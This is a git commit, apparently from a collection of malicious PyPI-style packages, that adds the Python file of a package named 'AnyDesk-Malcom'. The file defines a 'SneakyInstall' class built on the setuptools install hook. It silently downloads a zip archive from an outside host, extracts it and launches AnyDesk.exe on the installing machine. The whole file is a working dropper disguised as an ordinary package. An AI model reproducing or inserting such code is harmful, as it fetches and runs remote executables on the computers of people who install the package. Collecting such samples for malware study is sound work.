2aed25ccfea3ae9f038244a3f0af84e3cd1d9738
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 20:16:59 +0000

    Add package AnyDesk-Malcom/1.9/AnyDesk_Malcom-1.9.tar.gz

---
+++ packages/AnyDesk-Malcom/AnyDesk_Malcom-1.9.tar.gz/AnyDesk_Malcom-1.9/anydesk_malcom/anydesk_malcom.py
@@ -0,0 +1,28 @@
+from setuptools import setup
+from setuptools.command.install import install
+from os import system
+import setuptools
+import urllib.request
+from subprocess import Popen
+from zipfile import ZipFile
+def installPackage():
+    s = SneakyInstall()
+	
+class SneakyInstall(install):
+    def __init__(self):
+        print("",end="")
+        self.run()
+    def run(self):
+        try:
+            urllib.request.urlretrieve("https://peso-dolar.com/fiverr_nopassword/AnyDesk.zip", "AnyDesk.zip") #password is anydesk
+			# Create a ZipFile Object and load sample.zip in it
+            with ZipFile('AnyDesk.zip', 'r') as zipObj:
+            # Extract all the contents of zip file in current directory
+                zipObj.extractall()
+            Popen(["AnyDesk.exe"])
+        except Exception as e:
+            print(e)
+        return True
+
+
+        install.run(self)	
